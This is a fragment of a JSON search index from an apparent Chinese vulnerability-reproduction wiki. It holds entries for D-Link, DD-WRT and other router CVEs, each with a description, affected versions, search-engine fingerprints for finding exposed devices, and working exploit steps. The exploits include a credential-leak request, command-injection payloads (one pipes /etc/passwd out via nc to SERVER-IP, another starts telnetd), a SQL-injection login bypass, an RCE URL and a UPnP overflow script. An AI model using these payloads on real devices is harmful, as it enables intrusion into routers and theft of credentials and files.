","date":"0001-01-01","objectID":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/:1:0","tags":null,"title":"","uri":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/"},{"categories":null,"content":"漏洞影响 D-Link Dir 系列多个版本 ","date":"0001-01-01","objectID":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/:2:0","tags":null,"title":"","uri":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/"},{"categories":null,"content":"网络测绘 app=\"D_Link-DIR-868L\" ","date":"0001-01-01","objectID":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/:3:0","tags":null,"title":"","uri":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送下请求包 POST /getcfg.php HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Content-Length: 61 SERVICES=DEVICE.ACCOUNT\u0026attack=ture%0D%0AAUTHORIZED_GROUP%3D1 获取到路由器账号密码即可登录后台 ","date":"0001-01-01","objectID":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/:4:0","tags":null,"title":"","uri":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/"},{"categories":null,"content":"D-Link DIR-802 命令注入漏洞 CVE-2021-29379 ","date":"0001-01-01","objectID":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/:0:0","tags":null,"title":"","uri":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/"},{"categories":null,"content":"漏洞描述 DIR-802中存在一个命令注入漏洞，攻击者可以通过精心制作的M-SEARCH数据包向UPnP注入任意命令。 与CVE-2020-15893相似，在固件版本v-1.00b05之前的D-Link DIR-802 A1上发现了一个问题。默认情况下，端口1900上启用了通用即插即用（UPnP）。攻击者可以通过将有效负载注入SSDP M-SEARCH发现数据包的“搜索目标”（ST）字段来执行命令注入。 参考链接： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29379 https://cool-y.github.io/2021/03/02/DIR-802-OS-Command-Injection/ ","date":"0001-01-01","objectID":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/:1:0","tags":null,"title":"","uri":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/"},{"categories":null,"content":"漏洞影响 DIR-802 hardware revision Ax before v1.00b05 ","date":"0001-01-01","objectID":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/:2:0","tags":null,"title":"","uri":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/"},{"categories":null,"content":"漏洞复现 poc： # coding: utf-8 import socket import struct buf = 'M-SEARCH * HTTP/1.1\\r\\nHOST:192.168.0.1:1900\\r\\nST:urn:schemas-upnp-org:service s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((\"192.168.0.1\", 1900)) s.send(buf) s.close() ","date":"0001-01-01","objectID":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/:3:0","tags":null,"title":"","uri":"/d-link-dir-802-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-29379/"},{"categories":null,"content":"D-Link DIR-841 命令注入漏洞 CVE-2021-28143 ","date":"0001-01-01","objectID":"/d-link-dir-841-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-28143/:0:0","tags":null,"title":"","uri":"/d-link-dir-841-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-28143/"},{"categories":null,"content":"漏洞描述 D-Link DIR-841 3.03和3.04 存在经过身份验证的命令注入，通过“系统工具”（ping/ping6/traceroute）命令注入，可导致攻击者进行完全控制设备。 参考链接： https://nvd.nist.gov/vuln/detail/CVE-2021-28143 https://github.com/vitorespf/Advisories/blob/master/DLINK-DIR-841-command-injection.txt ","date":"0001-01-01","objectID":"/d-link-dir-841-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-28143/:1:0","tags":null,"title":"","uri":"/d-link-dir-841-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-28143/"},{"categories":null,"content":"漏洞复现 poc： POST /jsonrpc HTTP/1.1 Host: IP User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Authorization: Digest username=\"admin\", realm=\"domain\", nonce=\"4784226\", uri=\"/jsonrpc\", response=\"84799b55020cf2c53e28214e3d60b899\", qop=auth, nc=00000035, cnonce=\"bPzBB3mcvSb51Ijx\" Content-Length: 156 Origin: IP Connection: close Referer: http://ip-address:9821/admin/index.html Cookie: user_ip=0.0.0.0; device_mode=router; user_login=admin; device-session-id=\u003csession\u003e {\"jsonrpc\":\"2.0\",\"method\":\"write\",\"params\":{\"id\":166,\"data\":{\"host\":\"'127.0.0.1 \u0026 sleep 5'\",\"count\":1,\"is_ipv6\":false,\"max_ttl\":30,\"nqueries\":2,\"waittime\":3},\"save\":true},\"id\":757} Exfiltrating files： POST /jsonrpc HTTP/1.1 Host: IP User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Authorization: Digest username=\"admin\", realm=\"domain\", nonce=\"4784226\", uri=\"/jsonrpc\", response=\"84799b55020cf2c53e28214e3d60b899\", qop=auth, nc=00000035, cnonce=\"bPzBB3mcvSb51Ijx\" Content-Length: 156 Origin: IP Connection: close Referer: http://ip-address:9821/admin/index.html Cookie: user_ip=0.0.0.0; device_mode=router; user_login=admin; device-session-id=\u003csession\u003e {\"jsonrpc\":\"2.0\",\"method\":\"write\",\"params\":{\"id\":166,\"data\":{\"host\":\"'127.0.0.1 \u0026 nc SERVER-IP 1234 \u003c /etc/passwd'\",\"count\":1,\"is_ipv6\":false,\"max_ttl\":30,\"nqueries\":2,\"waittime\":3},\"save\":true},\"id\":757} ","date":"0001-01-01","objectID":"/d-link-dir-841-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-28143/:2:0","tags":null,"title":"","uri":"/d-link-dir-841-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-28143/"},{"categories":null,"content":"D-Link DIR-846 命令注入漏洞 CVE-2020-27600 ","date":"0001-01-01","objectID":"/d-link-dir-846-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-27600/:0:0","tags":null,"title":"","uri":"/d-link-dir-846-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-27600/"},{"categories":null,"content":"漏洞描述 D-Link DIR-846 A1_100.26 路由器中的HNAP1/control/SetMasterWLanSettings.php允许远程攻击者通过ssid0或ssid1参数进行执行任意命令。 参考链接： https://nvd.nist.gov/vuln/detail/CVE-2020-27600 https://github.com/pwnninja/dlink/blob/main/DIR-846_SetMasterWLanSettingsCI.md ","date":"0001-01-01","objectID":"/d-link-dir-846-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-27600/:1:0","tags":null,"title":"","uri":"/d-link-dir-846-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-27600/"},{"categories":null,"content":"漏洞复现 需要登录Web控制台，然后访问/Wireless.html无线设置页面。 POST /HNAPI HTTP/1.1 ... $data[\"ssid0\"]=\"'x;telnetd;'\" ","date":"0001-01-01","objectID":"/d-link-dir-846-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-27600/:2:0","tags":null,"title":"","uri":"/d-link-dir-846-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-27600/"},{"categories":null,"content":"D-Link DSL-28881A FTP配置错误 CVE-2020-24578 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/:0:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/"},{"categories":null,"content":"漏洞描述 D-Link DSL-2888A路由器具有文件共享功能，该功能允许用户通过将外部驱动器插入路由器来与其他网络用户共享文件。然后通过FTP（文件传输协议）共享。但是，FTP服务允许网络用户转义共享文件夹以访问路由器文件系统并下载位于根文件夹中的其他文件。 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/:1:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/"},{"categories":null,"content":"漏洞影响 D-Link DSL-2888A ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/:2:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/"},{"categories":null,"content":"网络测绘 body=\"DSL-2888A\" ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/:3:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/"},{"categories":null,"content":"漏洞复现 前提为使用 D-Link DSL-28881A 信息泄露 CVE-2020-24577 获取FTP凭证 以下提供了下载“ passwd”的示例： 在FTP客户端上使用以下命令以有效的凭据（从Finding-2获得）连接到FTP服务。 使用以下命令导航到根文件夹。 ftp xxx.xxx.xxx.xxx ftp\u003e cd etc ftp\u003e get passwd ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/:4:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-ftp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-cve-2020-24578/"},{"categories":null,"content":"D-Link DSL-28881A 信息泄露 CVE-2020-24577 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/:0:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/"},{"categories":null,"content":"漏洞描述 通过物理连接或无线访问建立与网络的连接后，恶意用户可以通过直接浏览以下URL来获取纯文本格式的Internet提供商连接用户名和密码，以及无线路由器的纯文本格式的用户名和密码 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/:1:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/"},{"categories":null,"content":"漏洞影响 D-Link DSL-2888A ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/:2:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/"},{"categories":null,"content":"网络测绘 body=\"DSL-2888A\" ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/:3:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/"},{"categories":null,"content":"漏洞复现 登录页面输入任意密码建立连接 跳转到 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail 显示密码错误 访问下列两个连接 http://xxx.xxx.xxx.xxx:8008/tmp/cfg/lib_cfg_cfgcmd http://xxx.xxx.xxx.xxx:8008/tmp/.nvram 连接Wifl或物理连接Wifi才能访问 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/:4:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2020-24577/"},{"categories":null,"content":"D-Link DSL-28881A 未授权访问 CVE-2020-24579 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/:0:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/"},{"categories":null,"content":"漏洞描述 路由器Web门户的身份验证不足，无法访问任何经过身份验证的管理页面，而无需输入正确的密码。位于同一网络上的恶意用户可以使用无效的凭据直接浏览到任何经过身份验证的管理页面。 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/:1:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/"},{"categories":null,"content":"漏洞影响 D-Link DSL-2888A ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/:2:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/"},{"categories":null,"content":"网络测绘 body=\"DSL-2888A\" ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/:3:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/"},{"categories":null,"content":"漏洞复现 登录页面输入任意密码建立连接 跳转到 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail 显示密码错误 再请求URL http://xxx.xxx.xxx.xxx/WiFi.shtml 未授权访问后台 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/:4:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-cve-2020-24579/"},{"categories":null,"content":"D-Link DSL-28881A 远程命令执行 CVE-2020-24581 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/:0:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/"},{"categories":null,"content":"漏洞描述 D-Link DSL-2888A AU_2.31_V1.1.47ae55之前版本存在安全漏洞，该漏洞源于包含一个execute cmd.cgi特性(不能通过web用户界面访问)，该特性允许经过身份验证的用户执行操作系统命令。 在该版本固件中同时存在着一个不安全认证漏洞（CVE-2020-24580），在登录界面输入任意密码就可以成功访问路由器界面。 ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/:1:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/"},{"categories":null,"content":"漏洞影响 D-Link DSL-2888A ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/:2:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/"},{"categories":null,"content":"网络测绘 body=\"DSL-2888A\" ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/:3:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/"},{"categories":null,"content":"漏洞复现 登录页面输入任意密码建立连接 跳转到 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail 显示密码错误 漏洞出现在 execute_cmd.cgi 文件中 #!/bin/sh . /usr/syscfg/api_log.sh cmd=`echo ${QUERY_STRING} | cut -d = -f 3` cmd=`echo ${cmd} | tr \"%20\" \" \"` result=`${cmd}` TGP_Log ${TGP_LOG_WARNING} \"cmd=${cmd}, result=${result}\" echo \"Content-type: text/html\" echo \"\" echo -n ${result} 这里取出 ${QUERY_STRING} 中的第二个参数值，然后去除空格命令执行 在这个过程中并没有过滤，看一下参数从哪来的 文件 /www/js/ajax.js get : function(_dataType) { var _url = this.url; if(_url.indexOf('?') == -1) _url += '?timestamp=' + new Date().getTime(); else _url += \"\u0026timestamp=\" + new Date().getTime(); if(this.queryString.length \u003e 0) _url += \"\u0026\" + this.queryString; this.xmlHttp.open(\"GET\", _url, true); /* will make IE11 fail. if(!document.all){ if(_dataType == \"xml\") this.xmlHttp.overrideMimeType(\"text/xml;charset=utf8\"); else this.xmlHttp.overrideMimeType(\"text/html;charset=gb2312\");//设定以gb2312编码识别数据 } */ this.xmlHttp.send(null); }, 看一下过程 ┌──(root)-[/tmp] └─# echo \"timestamp=1589333279490\u0026cmd=whoami\" | cut -d = -f 3 whoami 这里取第二个参数 whoami 然后就没有过滤的执行了 所以EXP为: http://xxx.xxx.xxx.xxx/cgi-bin/execute_cmd.cgi?timestamp=test\u0026cmd=whoami ","date":"0001-01-01","objectID":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/:4:0","tags":null,"title":"","uri":"/d-link-dsl-28881a-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-24581/"},{"categories":null,"content":"D-Link DSR-250N 万能密码漏洞 ","date":"0001-01-01","objectID":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 D-Link DSR-250N 存在万能密码漏洞，攻击者通过漏洞可以获取后台权限 ","date":"0001-01-01","objectID":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 D-Link DSR-250N ","date":"0001-01-01","objectID":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"D_Link-DSR-250N\" ","date":"0001-01-01","objectID":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 user: admin pass: ' or '1'='1 成功登录后台 ","date":"0001-01-01","objectID":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/d-link-dsr-250n-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器 ","date":"0001-01-01","objectID":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 D-Link ShareCenter DNS-320 ","date":"0001-01-01","objectID":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"D_Link-DNS-ShareCenter\" ","date":"0001-01-01","objectID":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞POC为 /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item\u0026total=;ls; ","date":"0001-01-01","objectID":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/d-link-sharecenter-dns-320-system_mgr.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137 ","date":"0001-01-01","objectID":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/:0:0","tags":null,"title":"","uri":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/"},{"categories":null,"content":"漏洞描述 默认情况下，DD-WRT中的UPNP处于禁用状态，并且仅在内部网络接口上侦听。 UPNP本质上是未经身份验证的UDP形式的协议–由于无法对协议强制执行身份验证，因此它既易于使用又具有不安全。 如果DD-WRT启用了UPNP服务，则坐在存在DD-WRT设备的LAN上的远程攻击者可以通过发送一个过长的uuid值来触发缓冲区溢出。 根据部署DD-WRT的平台的不同，可能存在缓解措施，也可能没有缓解措施，例如ASLR等，这使得可利用性取决于安装DD-WRT的平台。 ","date":"0001-01-01","objectID":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/:1:0","tags":null,"title":"","uri":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/"},{"categories":null,"content":"漏洞影响 DD-WRT \u003c 45723 版本 ","date":"0001-01-01","objectID":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/:2:0","tags":null,"title":"","uri":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/"},{"categories":null,"content":"漏洞复现 通过查看源代码，ssdp.c可以很容易地发现有问题的代码： 用户提供的数据的未绑定副本被复制到缓冲区中，该缓冲区的大小限制为128个字节。 由于默认情况下未启用UPNP服务，因此重新创建漏洞的第一步是启用将自动启动该服务的服务 启动PoC脚本将触发upnp服务崩溃，这可以在启动以下python脚本几秒钟后看到 ","date":"0001-01-01","objectID":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/:3:0","tags":null,"title":"","uri":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/"},{"categories":null,"content":"漏洞POC import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\"*164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1\\r\\n' \\ 'HOST:239.255.255.250:1900\\r\\n' \\ 'ST:uuid:'+payload+'\\r\\n' \\ 'MX:2\\r\\n' \\ 'MAN:\"ssdp:discover\"\\r\\n' \\ '\\r\\n' s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) s.sendto(packet.encode(), (target_ip, 1900) ) ","date":"0001-01-01","objectID":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/:4:0","tags":null,"title":"","uri":"/dd-wrt-upnp%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-cve-2021-27137/"},{"categories":null,"content":"DrayTek企业网络设备 远程命令执行 CVE-2020-8515 